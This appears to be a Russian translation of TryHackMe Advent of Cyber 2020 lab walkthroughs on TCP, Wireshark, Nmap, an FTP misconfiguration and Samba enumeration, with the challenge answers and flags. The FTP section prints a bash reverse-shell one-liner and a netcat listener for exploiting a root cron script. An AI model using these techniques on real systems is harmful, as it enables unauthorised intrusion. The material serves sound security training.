Это достигается с помощью NAT , однако подробное описание того, как именно это работает, выходит за рамки сегодняшней задачи.


Протоколы 101
Поскольку, по прогнозам, к концу 2020 года к Интернету будет подключено 50 миллиардов устройств ( https://www.cisco.
com/c/dam/en_us/about/ac79/docs/innov/IoT_IBSG_0411FINAL.pdf ), хаос быстро наступит, если не будет основных правил 
того, как устройства должны взаимодействовать друг с другом.  



Если это немного сбивает с толку - я вас не виню, просто потерпите меня. Подумайте об этом так: вы используете 
протоколы в повседневной жизни! Когда вы разговариваете с кем-то, вы оба будете использовать один и тот же набор 
протоколов... в противном случае никто не поймет друг друга. По крайней мере, все стороны, желающие общаться, будут 
использовать один и тот же язык - это протокол! Другие протоколы также могут включать контекст или тему разговора. 
Если кто-то отклонится от этих протоколов - он рискует быть непонятым! То же самое касается и сетевых устройств.    

Вернемся к техническим вопросам...
Введите протоколы, такие как модели TCP/IP и UDP/IP. Поскольку TCP/IP является наиболее распространенным сегодня, мы 
обсудим это подробнее. TCP /IP — это протокол, который гарантирует, что любые отправленные данные обрабатываются в 
том же порядке. Возвращаясь к нашей почтовой системе, ваше письмо будет отправлено во многие места — даже при 
отправке внутри страны. Ваш компьютерный трафик делает то же самое, переходя с устройства на устройство в процессе, 
называемом маршрутизацией. Одно устройство может доставлять данные быстрее (и в результате в другом порядке), чем 
другое, вызывая головную боль в ситуациях, когда важна точность, например, в следующих случаях:     


### Загрузка файлов
Посещение веб-сайта в вашем браузере
Отправка писем
Это не похоже на протокол UDP, где наличие всех пакетов не так важно (что делает протокол намного быстрее, чем 
TCP/IP), поэтому такие приложения, как потоковое видео, используют UDP (например, Skype). Нас не особо волнует, если 
несколько пакетов потеряются, поскольку мы все равно можем видеть большую часть изображения.  


Как TCP /IP отправляет данные? Трехэтапное рукопожатие:
Трехэтапное рукопожатие — это метод, который делает TCP надежным. Любые отправляемые данные получают случайную 
числовую последовательность и реконструируются с использованием этой числовой последовательности и увеличения на 1. 
Оба компьютера должны договориться об одной и той же числовой последовательности, чтобы данные отправлялись в 
правильном порядке. Этот порядок согласовывается в течение трех шагов.   

На схеме ниже «Клиент» имеет начальный порядковый номер (ISN) «0», а «Сервер» — «5000». Любые данные, отправленные 
«Клиентом» и полученные на «Сервере», будут иметь начальную последовательность + 1. Если это первый пакет от 
«Клиента», это будет «0 + 1». Я показал три пакета, отправленных «Клиентом» в таблице ниже, чтобы продемонстрировать это:  

Устройство	Начальный порядковый номер (IN)	Окончательный порядковый номер	
Клиент (Отправитель)	0	0 + 1 = 1	
Клиент (Отправитель)	1	1 + 1 = 2	
Клиент (Отправитель)	2	2 + 1 = 3	
https://www.open.edu/openlearncreate/pluginfile.php/258370/mod_oucontent/oucontent/35227/9b0bce6c/594a9486/cn_black_fig3.jpg


SYN - Клиент: Вот моя начальная числовая последовательность (ISN) для SYN- хронизации с (0)
SYN/ACK - Сервер: Вот моя начальная числовая последовательность (ISN) для синхронизации SYN с (5000), и я 
подтверждаю вашу начальную числовую последовательность (0) 
ACK - Клиент: Я подтверждаю , что ваша начальная числовая последовательность (ISN) равна (5000). Вот некоторые 
данные, которые являются моим ISN+1. 
При получении данных они собираются заново приемником. Покажем условия, при которых требуется сборка заново:

Примеры повторной сборки данных TCP :
Повторная сборка не требуется:
Если бы «Сервер» получал данные в том же порядке, в котором они были отправлены «Клиентом»:


Отправлено 1-е - Получено 1-е
Отправлено 2-е - Получено 2-е
Отправлено 3-е - Получено 3-е
В этом случае повторная сборка не требуется, поскольку данные принимаются в том же порядке, в котором они были 
отправлены. 


Требуется повторная сборка:
Например, если «Сервер» должен был получить все данные, но в порядке, отличном от того, в котором они были 
отправлены, требуется повторная сборка: 


Отправлено 1-е - Получено 1-е
Отправлено 2-м - Получено 3-м
Отправлено 3-м - Получено 2-м
Поскольку все данные получены, просто в другом порядке, их можно собрать заново, используя согласованные порядковые 
номера, которые были бы переданы во время трехстороннего рукопожатия. 


Соединение разорвано:
Если «Клиент» должен был отправить три пакета, но «Сервер» получил только два  из трех пакетов, они отключаются друг 
от друга, поскольку отправленные данные повреждены: 


Отправлено 1-е - Получено 1-е
Отправлено 2-е - Не получено
Отправлено 3-м - Получено 2-м
Данные не будут обработаны «Сервером», поскольку пакет, отправленный вторым «Клиентом», так и не был получен 
«Сервером» №2, что означает потерю данных на пути. 


### Ускоренный курс по мониторингу сетевого трафика:
Умение точно захватить то, что передается по сети, и понимание этого — важный навык в области информационных 
технологий. От диагностики до захвата учетных данных, должности в ИТ, от системных администраторов до цифровой 
криминалистики и американских пентестеров, используют сетевой трафик по-своему. Например, поскольку данные, 
отправляемые по HTTP или FTP, не зашифрованы, пентестер может перехватывать имена пользователей и пароли, вводимые 
на веб-сайте.    


### Представляем Wireshark:
Wireshark способен записывать журнал всех пакетов, отправленных и полученных на сетевом адаптере компьютера. 
Например, мы можем увидеть, как компьютер (выделен красным) подключился к компьютеру (выделен черным), на котором 
был запущен веб-сервер через HTTP , в данном случае это была веб-страница: web_server/download.HTML, которую мы 
можем экспортировать и просмотреть самостоятельно:   

https://assets.tryhackme.com/additional/cmn-aoc2020/day-8/4.png



https://assets.tryhackme.com/additional/cmn-aoc2020/day-8/5.png

Однако сети довольно шумные... Wireshark захватил 2648 пакетов за одну минуту на моей машине. Это очень усложняет 
анализ. К счастью, мы можем использовать фильтры, чтобы сузить результаты. Мы можем фильтровать по многим параметрам,
но мы рассмотрим только несколько важных в таблице ниже. Обратите внимание, что во всех примерах ниже используется 
оператор, ==чтобы проверить, соответствует ли фильтр точно заданному нами значению.   


https://assets.tryhackme.com/additional/cmn-aoc2020/day-8/6.png


Объединение фильтров с операторами
Оператор	Описание	Пример
==	Этот оператор можно использовать для проверки того, соответствует ли фильтр значению, указанному во всех пакетах.
ip.addr == 192.168.1.1покажет все пакеты с IP-адресом 192.168.1.1(это может быть источник или пункт назначения) 
"="	Этот оператор проверяет, не соответствует ли фильтр значению, указанному во всех пакетах.	ip.addr != 192.168.1.
10покажет все пакеты, которые не содержат IP-адрес 192.168.1.10(это может быть источник или пункт назначения)  
&&	Используйте этот оператор для объединения нескольких фильтров.	Например, чтобы показать все пакеты, связанные с 
двумя разными IP-адресами, ip.addr == 192.168.1.1 && ip.addr == 192.168.1.10будут показаны только пакеты с исходными 
или целевыми IP-адресами 192.168.1.1или192.168.1.10  
Экспорт данных из Wireshark:
Как было показано ранее, Wireshark может экспортировать данные из таких протоколов, как HTTP, перейдя в «Файл → 
Экспортировать объекты» и выбрав доступный протокол. На снимках экрана ниже мы перечисляем объекты, которые можно 
экспортировать из протокола обмена файлами SMB.  

https://assets.tryhackme.com/additional/cmn-aoc2020/day-8/7.png



Мы экспортируем файл «test.txt» на наше устройство.

https://assets.tryhackme.com/additional/cmn-aoc2020/day-8/8.png

Как отмечено ниже:
https://assets.tryhackme.com/additional/cmn-aoc2020/day-8/9.png


Испытание
Загрузите ZIP-файл «aocpcaps.zip», прикрепленный к этому заданию, используйте комбинацию фильтров и функций 
Wireshark, которые мы рассмотрели, чтобы ответить на вопросы ниже: 

### Ответить на вопросы ниже
Откройте "pcap1.pcap" в Wireshark. Какой IP-адрес инициирует ICMP/ping?
```commandline
10.11.3.2
```
Если бы мы хотели видеть только HTTP-запросы GET в нашем файле «pcap1.pcap», какой фильтр мы бы использовали?
```commandline
http.request.method == GET
```
Теперь примените этот фильтр к «pcap1.pcap» в Wireshark. Как называется статья, которую посетил IP-адрес « 10.10.67.
199 »? 
```commandline
reindeer-of-the-week
```
Давайте начнем анализировать "pcap2.pcap". Посмотрите на захваченный FTP-трафик; какой пароль был раскрыт в процессе 
входа? 

Здесь много нерелевантных данных. Было бы полезно использовать фильтр!
```commandline
plaintext_password_fiasco
```
Продолжая наш анализ «pcap2.pcap», как называется протокол, который зашифрован?
```commandline
SSH
```
Проанализируйте «pcap3.pcap» и восстановите Рождество!

Что есть в списке желаний Эльфа МакСкиди, что заменит Эльфа МакИгера?
```commandline
Rubber ducky
```

## Задание 13
Посмотрите видео DarkStar о решении этой задачи

День 8: Что под елкой? - История:
После нескольких месяцев испытательного срока стажер Эльф МакИгер получил восторженные отзывы от Эльфа МакСкиди. Во 
время встречи Эльф МакИгер попросил предоставить ему больше доступа к внутренней сети The Best Festival Company 
(TBFC), поскольку он хотел узнать больше о системах, которые он поклялся защищать.  

Elf McSkidy не хотел соглашаться. Однако после героических действий Elf McEager по возвращению Рождества, Elf 
McSkidy вскоре подумал, что это хорошая идея. Это была неизведанная территория для Elf McEager — он понятия не имел, 
как начать искать эту информацию для своих новых обязанностей. К счастью, в TBFC есть замечательная программа 
повышения квалификации, охватывающая использование Nmap , в которую ElfMcEager может записаться.   


### 8.1 Начало работы:
Прежде чем начать, нам нужно будет развернуть два экземпляра:

THM AttackBox можно запустить, нажав кнопку « Запустить AttackBox » в правом верхнем углу страницы.
Уязвимый экземпляр прикрепляется к этой задаче нажатием кнопки « Развернуть » в правом верхнем углу этой задачи/дня.
### 8.2 Цели обучения на сегодня:
Мы собираемся изучить использование Nmap на этапе сбора информации, чтобы составить картину служб, работающих на 
удаленном компьютере, и понять, как их можно использовать. Мы также покажем, как сканирование Nmap может быть 
обнаружено и заблокировано с помощью брандмауэров.  

Сделано с ❤ от CMNatic

### 8.3 Введение в Nmap :
Nmap — это инструмент с открытым исходным кодом, расширяемый и, что немаловажно, бесплатный, который является одним 
из отраслевых стандартов, который должен быть в наборе инструментов у каждого. Nmap способен на несколько вещей, 
которые необходимы на этапах сбора информации методологии тестирования на проникновение, такой как Стандарт 
выполнения тестирования на проникновение (PTES), включая:   
- Обнаружение хоста
- Обнаружение уязвимостей
- Обнаружение сервисов/приложений
### 8.4 Базовая функциональность Nmap
Мы быстро рассмотрим основы начала работы с Nmap, типы сканирования и синтаксис для этих типов соответственно. Мы 
применим наши сетевые знания, полученные вчера в "День 7 - Гринч действительно украл Рождество", чтобы понять 
разницу между сканированием TCP и UDP.  


### 8.4.1 TCP -сканирование
Есть два распространенных типа сканирования TCP, которые вы будете использовать в Nmap. На первый взгляд они кажутся 
выполняющими одно и то же, однако, они очень разные. Прежде чем мы разберем это, давайте снова проиллюстрируем 
трехэтапное рукопожатие TCP/IP и повторим три этапа «обычного» трехэтапного рукопожатия:  

СИН
СИН/АК
АСК

(Открытый университет, Северная Дакота)

Подключить сканирование -nmap -sT <ip>
SYN-сканирование -nmap -sS <ip>
### 8.4.1.1 SYN-сканирование:
Самый предпочтительный тип сканирования, Nmap использует сканирование TCP SYN ( -sS), если сканирование выполняется 
с правами администратора и другой тип не предоставлен. В отличие от сканирования с подключением, этот тип 
сканирования не выполняет "трехстороннее рукопожатие", как это обычно происходит. Вместо этого, после получения 
"SYN/ACK" от удаленного хоста, хост, с которого мы сканируем, отправляет пакет "RST" (никогда не завершая соединение).   

Этот тип сканирования является наиболее предпочтительным методом, поскольку Nmap может использовать всю информацию, 
собранную во время рукопожатия, для определения статуса порта на основе ответа, который дает сканируемый IP-адрес:  

SYN/ACK = открыто
RST = Закрыто
Несколько попыток = отфильтровано
Более того, поскольку по сети передается меньше пакетов, снижается вероятность обнаружения.


### 8.4.1.2.Подключить сканирование:
В отличие от сканирования SYN, для запуска этого сканирования не требуются административные привилегии. Это 
происходит из-за того, что Nmap использует Berkeley Sockets API  , который быстро сформировался как стандартный 
метод взаимодействия таких служб, как веб-приложения, с операционной системой. В результате того, что Nmap 
отправляет больше пакетов, это сканирование легче обнаружить и оно занимает больше времени. Более того, поскольку 
«трехэтапное рукопожатие» завершается так, как если бы это было обычное соединение, его гораздо удобнее регистрировать.    


### 8.5 Шаблоны синхронизации Nmap
Nmap позволяет пользователю определить производительность Nmap. Измеряя агрессивность, пользователь может 
использовать один из шести профилей [от 0 до 5], чтобы изменить скорость сканирования Nmap-T0 . Будучи самым 
скрытным, этот профиль сканирует один порт каждые 5 минут, тогда как -T5считается как самым агрессивным, так и 
потенциально неточным. Это связано с тем, что он -T5ждет всего 0,3 секунды, пока удаленное устройство ответит на 
рукопожатие. Факторы, такие как перечисленные ниже, определяют точность этих сканирований:

Использование ресурсов удаленного сервера ниже. Чем выше использование, тем медленнее отправляется ответ Nmap.
Качество соединения. Если у вас медленное или нестабильное соединение, вы, скорее всего, пропустите ответы, если 
отправляете много пакетов одновременно. 
В общем, для реальных сценариев вам следует использовать низкоагрессивные профили, однако в лабораторных условиях, 
где шум не имеет значения, высокоагрессивные профили оказываются самыми быстрыми. Для перспективы, Nmap использует 
-T3, если профиль не указан. В ситуации пентестинга вы были бы склонны использовать более низкое значение, например, 
в лабораторных условиях, более высокое значение -T4будет достаточным, поскольку скрытность не так критична.


### 8.6 Введение в скриптовый движок Nmap
Недавнее дополнение к Nmap —  N map  S cripting  Engine или сокращенно NSE. Эта функция вводит в Nmap «плагиновую» 
природу , где скрипты могут использоваться для автоматизации различных действий, таких как: 

Эксплуатация
Фаззинг
Брутфорсинг
На момент написания статьи NSE поставлялся с 603 скриптами, с которыми можно ознакомиться здесь.

nsedoc
Страница документации Nmaps NSE

Возьмем, к примеру, скрипт FTP ProFTPD Backdoor. Этот скрипт пытается эксплуатировать FTP- сервис, на котором 
запущена версия ProFTPD 1.3.3c, версия которой отпечатывается самим Nmap. 

Мы можем предоставить скрипт, который хотим использовать, используя флаг --scriptв Nmap, например, так:nmap --script ftp-proftpd-backdoor -p 21 <ip_address>


### 8.7 Дополнительные типы сканирования:
Мы не только можем использовать TCP Scan Nmap , но Nmap также может похвастаться комбинацией этих типов для 
различных действий, которые полезны для нас на этапе сбора информации. Я отсортировал их в таблице ниже, дав краткое 
объяснение их назначения.  

(Где xxxx == MACHINE_IP )

Флаг	Пример использования	Описание
-А	nmap -A x.x.x.x	Сканирование хоста для идентификации запущенных служб путем сопоставления с базой данных Nmap с функцией обнаружения ОС .
-О	nmap -O x.x.x.x	Сканирование хоста для извлечения и обнаружения ОС
-п	nmap -p 22 x.x.x.x	Сканировать определенный номер порта на хосте. Диапазон портов также может быть предоставлен (например, 10-100) с использованием первого и последнего значения диапазона, например:nmap -p 10-100 x.x.x.x
-п-	nmap -p- x.x.x.x	Сканировать все порты (0-65535) на хосте
-сВ	nmap -sV x.x.x.x	Сканирование хоста с использованием TCP и выполнение отпечатков версий
### 8.8 Защита от сканирования Nmap
Практика безопасности через неизвестность здесь не работает. Хотя может показаться логичным попытаться скрыть службу,
изменив ее номер порта на что-то, отличное от стандартного (например, изменив порт SSH с 22 на 2222), служба все 
равно будет идентифицирована во время сканирования Nmap (хотя и немного позже). К сожалению, вы не можете получить 
лучшее из обоих миров, имея службу доступной, но скрытой.

К счастью, системы обнаружения вторжений ( IDS ) и предотвращения вторжений (IPS) с открытым исходным кодом, такие 
как Snort и Suricata, позволяют участникам Blue Team защищать свои сети с помощью сетевого мониторинга. Например, вы 
можете установить эти службы на брандмауэрах, таких как pfSense : Панель управления брандмауэра pfSense .  


Наборы правил, такие как новые угрозы для Snort и Suricata, способны обнаруживать и блокировать широкий спектр 
потенциально вредоносного трафика, включая: 
- Вредоносный трафик
- Обратные снаряды
- Полезные нагрузки Metasploit

Nmap сканирует

Список правил Snort, установленных на брандмауэре pfSense.

Например, обнаружение полезной нагрузки Metasploit для CVE 2013-3205 : правило новой угрозы для обнаружения полезной 
нагрузки Metasploit для CVE -2013-3205. 


При правильной настройке можно обнаружить большинство сканирований Nmap . Это особенно актуально при использовании 
агрессивного шаблона синхронизации, такого как -T4или -T5. Давайте рассмотрим следующее обнаруженное сканирование 
Nmap : Запуск сканирования Nmap на брандмауэре pfSense.nmap -A 192.168.1.171  


Вернувшись в pfSense через несколько секунд, мы замечаем, что Snort генерирует оповещения: Просмотр новых оповещений,
созданных Snort в результате сканирования Nmap. 


Даже с шаблоном синхронизации -T3Snort способен обнаружить сканирование портов, где после 6 предупреждений (в данном 
случае) злоумышленник блокируется брандмауэром. После 6 предупреждений Snort блокирует IP-адрес, на котором запущено 
сканирование Nmap , от контакта с брандмауэром pfSense.  

Подтверждение того, что IP-адрес, на котором запущено сканирование Nmap, больше не может связаться с брандмауэром 
pfSense. 


### 8.9.Вызов
Разверните и используйте Nmap для сканирования экземпляра, прикрепленного к этой задаче. Запишите IP-адрес для 
сканирования: MACHINE_IPи перечислите его для Elf McEager! 

Дополнительный бонус : В результате того, что Эльф МакИгер сумел вернуть Рождество в " День 7 - Гринч действительно 
украл Рождество ", сайт TBFC был восстановлен для посещения всеми эльфами. Вы можете его найти? Я слышал, что он 
довольно читабельный... Вы должны добавить MACHINE_IP tbfc.blogв свой файл /etc/hosts, прежде чем приложение 
загрузится, как показано ниже:   
хозяева

### Ответить на вопросы ниже
Когда был создан Snort?
```commandline
1998
```
Используя Nmap на MACHINE_IP, каковы номера портов трех работающих служб? (Пожалуйста, укажите свой ответ в порядке 
возрастания / наименьший -> наибольший, разделенные запятой) 
```commandline
80,2222,3389
```
Запустите сканирование и укажите флаг, -Pnчтобы игнорировать ICMP, используемый для определения работоспособности хоста.
```commandline
Ответ не нужен
```
Поэкспериментируйте с различными настройками сканирования, такими как -Aи -sV , сравнивая полученные результаты.
```commandline
Ответ не нужен
```
Используйте Nmap для определения имени работающего дистрибутива Linux. Какой дистрибутив, по вашему мнению, работает 
наиболее вероятно? 
```commandline
Ubuntu
```
Используйте Nmap's Network S cripting Engine ( NSE ) для получения " HTTP-TITLE " веб-сервера. На основе 
возвращенного значения, как мы думаем, для чего может использоваться этот веб-сайт?  
```commandline
Blog
```
Теперь используйте различные скрипты для оставшихся служб, чтобы узнать о них дополнительную информацию.
```commandline
Ответ не нужен
```

## Задание 14
Посмотрите видео DarkStar о решении этой задачи

День 9: Каждый может стать Сантой - Прелюдия:

Даже Санте пришлось принять этику «работы из дома» в 2020 году. Чтобы помочь Санте, Эльф Макскиди и его команда 
создали файловый сервер для The Best Festival Company (TBFC), который использует протокол FTP . Однако 
злоумышленнику удалось взломать этот новый сервер. Ваша миссия, если вы решите принять ее, состоит в том, чтобы 
понять, как произошел этот взлом, и проследить шаги злоумышленника.   

### 9.1 Начало работы
Прежде чем начать, нам нужно будет развернуть два экземпляра:

THM AttackBox можно запустить, нажав кнопку « Запустить AttackBox » в правом верхнем углу страницы.
Уязвимый экземпляр прикрепляется к этой задаче нажатием кнопки « Развернуть » в правом верхнем углу этой задачи/дня.
Сделано с ❤ от CMNatic

### 9.2.  Цели обучения на сегодня:
понять основы работы файлового сервера FTP и некоторые распространенные ошибки конфигурации, чтобы в конечном итоге 
использовать их самостоятельно для получения доступа к tbfc-ftp-01. 

### 9.3. Что такое FTP и где он используется?
Протокол передачи файлов (FTP) предлагает не слишком захватывающие средства обмена файлами по сравнению с альтернативными
доступными протоколами. Хотя этот протокол не зашифрован, к нему можно получить доступ различными способами: от 
специального программного обеспечения, такого как FileZilla, командной строки или веб-браузеров, FTP -серверы уже 
давно используются для обмена файлами между устройствами через Интернет из-за своей совместимости.  


Доступ к FTP -серверу с помощью веб-браузера Mozilla Firefox.

При передаче данных FTP использует два соединения, как показано ниже:


(Киберхут., 2020)

Стандартом для этих двух подключений являются два порта:

Порт 20 (данные)
Порт 21 (Команды)
Команды включают такие действия, как листинг или навигация по каталогам, запись в файлы. В то время как порт данных 
— это место, где фактические данные, такие как загрузка/выгрузка файлов, передаются. 



### 9.4 . Нет учетных данных? Нет проблем! 
Перед тем, как какие-либо данные могут быть переданы, клиент должен войти на FTP-сервер. Это необходимо для 
определения команд, которые клиент имеет разрешение выполнять, и данных, которые могут быть переданы. Некоторые 
веб-сайты используют FTP для передачи файлов вместо самого веб-сервера. Конечно, это означает, что вам придется 
передавать имя пользователя/пароль каким-то другим способом — это непрактично.

Войти в режим FTP "Анонимный"... Эта настройка позволяет клиенту использовать имя пользователя по умолчанию с любым 
паролем. Этот пользователь рассматривается как любой другой пользователь на FTP -сервере - включая принудительное 
применение разрешений и привилегий к командам и данным. 



### 9.5 . Использование FTP через терминал

Мы будем использовать пакет "FTP", который устанавливается в большинстве сред Linux , но особенно в THM AttackBox. 
Для подключения мы просто используемftpи предоставляем IP-адрес экземпляра. В моем случае я бы использовалftp 10.10.
185.239, но вам нужно будет использоватьftp MACHINE_IP для вашего уязвимого экземпляра. 

Когда нас попросят ввести наше " Имя ", мы вводим "анонимный". В случае успеха мы подтверждаем, что на FTP-сервере 
включен "анонимный" режим - успешный вход выглядит так: 



Вы можете использовать  help команду, чтобы получить список некоторых команд, которые вы можете запустить, пока 
подключены к FTP-серверу. Вот краткое изложение основ: 

Давайте посмотрим на каталоги, доступные нам с помощью  ls. Есть только одна папка с данными, к которой наш 
пользователь имеет разрешение на доступ: 


Мы перейдем к нему с помощью ,  cd чтобы изменить наш рабочий каталог, а затем ls просмотреть содержимое. Файл в 
этой папке содержит файл с расширением ".sh". Это расширение является скриптом оболочки, который при выполнении 
будет запускать команды, которые мы программируем. Давайте используем, get чтобы получить  файл с сервера на наше 
устройство, чтобы понять, почему этот файл был оставлен здесь!   


### 9.6 Находим наш эксплойт
После загрузки файла откроем его на нашем устройстве с помощью текстового редактора терминала, например nano.



Нам не нужно понимать, что здесь происходит, за пределами комментариев. Скрипт выполняется каждую минуту (по словам 
Элфа МакИгера), создает резервную копию папки и сохраняет ее в домашнем каталоге Элфа МакИгера. Что, если бы мы 
заменили команды, выполняемые в этом скрипте, нашими собственными, вредоносными командами? Загрузка файла требует 
отдельного разрешения, которое не должно быть предоставлено «анонимному» пользователю. Однако разрешения очень легко 
пропустить — как в этом случае.    

### 9.6.1. Давайте воспользуемся шпаргалкой пентестеров, чтобы получить хорошую команду, которая будет выполнена 
сервером для
генерации оболочки для нашего AttackBox, заменив IP_ADDRESS на ваш TryHackMe IP, этот адрес отображается на панели 
навигации на странице доступа. 

bash -i >& /dev/tcp/Your_TryHackMe_IP/4444 0>&1



### 9.6.2 Давайте настроим netcat прослушиватель для перехвата соединения на нашем AttackBox:`nc -lvnp 4444`

### 9.6.3. Теперь мы попытаемся загрузить наш вредоносный скрипт в папку, на которую у нас есть права записи на FTP- 
сервере, вернувшись к нашему FTP- запросу 
и используя ,  put чтобы поместить  файл в этот каталог (убедившись, что это ваш текущий каталог).

### 9.6.4.  Вернитесь к нашему netcatслушателю, подождав одну минуту, вы должны увидеть вывод, как показано ниже! 
Успех! 
У нас есть обратная системная оболочка на FTP-сервере как у самого мощного пользователя. Любые команды, которые вы 
теперь используете, будут выполняться в системе FTP-сервера.  


Продолжайте использовать команды, похожие на те, что мы использовали ранее, чтобы найти содержимое root.txt, 
расположенного в корневом каталоге! Давайте разберем, что именно здесь произошло, и объясним причины, по которым 
произошел этот эксплойт:  

### 9.6.5.1. FTP-сервер имеет анонимный режим, позволяющий нам аутентифицироваться. Это не является изначально
небезопасным и имеет много законных применений.

### 9.6.5.2. Мы обнаружили, что у нас есть разрешение на загрузку и скачивание файлов. Хотя это также нормальное 
поведение для FTP- серверов, анонимные пользователи не должны иметь возможности загружать файлы. 

### 9.6.5.3. Мы интерпретировали информацию из легитимного скрипта резервного копирования, чтобы создать обратную 
оболочку на нашем хосте.

### 9.6.5.4. Скрипт выполняется от имени пользователя "root" - самого мощного в системе Linux. Это также уязвимость, 
так как теперь у нас есть полный доступ к системе. Использование этого пользователя должно быть ограничено везде, где 
это возможно. Если бы скрипт выполнялся от имени "elfmceager", у нас был бы доступ к системе только от имени этого 
пользователя (гораздо менее мощного в сравнении)   



#### 9.7.  Заключение, куда двигаться дальше и дополнительный материал:
Мы рассмотрели основы FTP-серверов и то, почему они все еще используются сегодня. Не только это, но
мы также узнали, как простые ошибки в конфигурации могут привести к полномасштабному взлому FTP-сервера. Если вы 
хотите узнать больше,  комната пошагового руководства Network Services (созданная Polomints) также охватывает FTP.  
Если вы хотите отточить свои навыки, вы можете найти комнату испытаний "Anonymous" (созданную Nameless0ne) забавным додзё.

### Ответить на вопросы ниже
Вопрос №1:  Назовите каталог на FTP-сервере, к данным которого имеет доступ «анонимный» пользователь.
```commandline
public
```
Вопрос №2:  Какой скрипт выполняется в этом каталоге?
```commandline
backup.sh
```
Вопрос №3:  Какой фильм был в списке рождественских покупок Санты?
```commandline
The Polar Express
```
Вопрос №4: Повторно загрузите этот скрипт, чтобы он содержал вредоносные данные (как мы это делали в разделе 9.6). 
Выведите содержимое /root/flag.txt! 

Обратите внимание, что скрипт, который мы загрузили, может занять минуту, чтобы вернуть соединение. Если этого не 
произойдет через пару минут, дважды проверьте, что вы настроили прослушиватель Netcat на устройстве, с которого 
работаете, и указали TryHackMe IP устройства, с которого подключаетесь.  
```commandline
THM{even_you_can_be_santa}
```

## Задание 15

День 10: Не будь таким эгоистичным - Прелюдия

The Best Festival Company (TBFC) с тех пор, как прошлогодняя атака пошла на повышение уровня своей 
IT-инфраструктуры для всех остальных эльфов, включая VPN- сервер и несколько других сервисов. Вы вздыхаете с 
облегчением... "Вот и все, я, эльф МакИгер спас Рождество 2020 года! Не могу дождаться, чтобы---"  
Но вдруг холодная дрожь пробегает по вашему позвоночнику, прерывая ваш монолог...

Вы внезапно вспоминаете, что Elf McSkidy настроил файловый сервер Samba как раз перед тем, как произошла атака — 
неужели он тоже был взломан?! А как насчет наших данных... О нет, быстро!  Выясните, какие имена пользователей 
могли быть украдены, и попробуйте войти на сервер самостоятельно, записывая все найденные уязвимости, чтобы сообщить 
об этом Elf McSkidy.   

Посмотрите видео DarkStars по решению этой задачи!

10.1 Начало работы:
Прежде чем начать, нам нужно будет развернуть два экземпляра:

THM AttackBox можно запустить, нажав кнопку «  Запустить AttackBox » в правом верхнем углу страницы.
Уязвимый экземпляр прикрепляется к этой задаче нажатием кнопки « Развернуть » в правом верхнем углу этой задачи/дня.

10.2. Цели обучения на сегодня:
изучить основы сетевых протоколов обмена файлами, прежде чем приступить к практической работе с Samba, где вам 
предстоит перечислить « tbfc-smb-01»  : уязвимый сервер Samba для получения несанкционированного доступа.  

Сделано с ❤ от  CMNatic

10.3. Что такое Samba и где она используется?

Хотя мы узнали об одном из самых распространенных протоколов, используемых для обмена файлами в 10-й день, мы 
рассмотрим альтернативную технологию для обмена файлами, которая чаще всего используется в сетях 
организаций/компаний. Предлагая шифрование в качестве стандарта, эта технология состоит из двух протоколов:  

SMB (Server Message Block) — поддерживается изначально в Windows, но не в Linux.
NFS (сетевая файловая система) — изначально поддерживается Linux , но не Windows.
Такие протоколы, как SMB, при общении друг с другом отправляют «запросы» и «ответы», как показано ниже:



(TechTarget., 2017)

Что делает Samba таким популярным и полезным, так это то, что он устраняет различия между этими двумя протоколами, а 
это означает, что две операционные системы теперь могут совместно использовать ресурсы, включая файлы, друг с другом.
Проще говоря, Samba подключается к «общему ресурсу» (представьте себе виртуальную папку) и может выполнять 
повседневные действия, такие как удаление, перемещение или загрузка файлов.   

Samba гибка в том смысле, что она может быть полезна как вам, так и мне, или компаниям с тысячами сотрудников. 
Например, сотрудники могут получать доступ к документам с центрального компьютера, а не хранить каждый сотрудник 
свою копию. Как упоминалось ранее, эта технология зашифрована, что позволяет безопасно передавать конфиденциальные 
данные, такие как имя пользователя и пароли, используемые в процессе аутентификации (и сами данные), между клиентом 
и сервером.    

В отличие от FTP , другие ИТ-устройства, такие как сетевые принтеры, также могут совместно использоваться 
клиентом/сервером. 

10.4. Поиск общих ресурсов Samba
Мы будем использовать  инструмент enum4linux  , который уже предоставлен вам на THM AttackBox. Давайте запачкаем руки!


Откройте терминал и перейдите к enum4linux: cd /root/Desktop/Tools/Miscellaneous
Запустите enum4linux и выпишите все возможные варианты, которые мы могли бы использовать. Найдите время, чтобы 
изучить их на предмет чего-нибудь 
интересного:  ./enum4linux.pl -h


Обратите внимание, как мы можем использовать такие опции, как  -S перечисление общих ресурсов или  -U (обратите 
внимание на заглавные буквы) перечисление возможных пользователей. В 
моем примере я хочу узнать, кто может быть использован для доступа к серверу через Samba: ./enum4linux.pl -U MACHINE_IP


Обратите внимание, как  enum4linux  обнаружил четырех пользователей в моем примере... У одного из этих пользователей 
может быть слабый пароль, например «password123», с помощью которого мы можем войти в систему и получить доступ к 
конфиденциальным данным как.  
1.  jjohns
2.  lbutton
3.  jfrost
4. cmnatic

И в результате дальнейшего перечисления с помощью  enum4linux мы обнаружили следующие три ресурса!
1.  homes
2.  share1
3.  IPC $


Теперь ваша очередь, просканируйте свой экземпляр ( MACHINE_IP ), чтобы ответить на  вопрос № 1  и  вопрос № 2. 
Запомните опции, которые 
мы можем использовать с  enum4linux.pl !

10.5 Подключение к общему ресурсу

Из предыдущего раздела мы уже усвоили две ключевые части информации:

Имена пользователей для аутентификации
Ресурсы, к которым мы можем получить доступ (помня, что ресурсы, скорее всего, содержат данные)
Однако очень распространенной и легко вызываемой администраторами уязвимостью являются неправильные разрешения. Вы 
можете получить доступ к общему ресурсу и его данным, не входя в систему вообще, как мы продемонстрируем ниже: 

1.  Помните, что IP-адрес сервера Samba — это IP-адрес развернутого вами экземпляра ( MACHINE_IP ).
2.  Используйте  инструмент smbclient, чтобы начать доступ к серверу Samba и его общим ресурсам, заменив «sharename» 
    на имя общего ресурса, к которому вы хотите получить доступ: smbclient //REPLACE_INSTANCE_IP_ADDRESS/**sharename** 
3.  Вам будет предложено ввести пароль, самый простой пароль — это отсутствие пароля!  Мы можем просто нажать  
    «Enter », чтобы проверить эту теорию. В случае успеха это означает, что общий доступ не требует аутентификации, 
    и мы теперь вошли в систему.  

Например, доступ к «share1» на другом устройстве:

 |

Вы можете использовать help команду, чтобы получить список некоторых команд, которые вы можете запустить, будучи 
подключенным к общему ресурсу Samba. Вот краткое изложение основ: 

Команда	Описание
лс	Список файлов и каталогов в текущем местоположении
cd <каталог>	Изменить наш рабочий каталог
пвд	Вывести полный путь к нашему рабочему каталогу
больше <имя файла>	Узнать  больше  о содержимом файла. Чтобы закрыть открытый файл, нажмите :q
получить <имя файла>	Загрузить файл из общего доступа
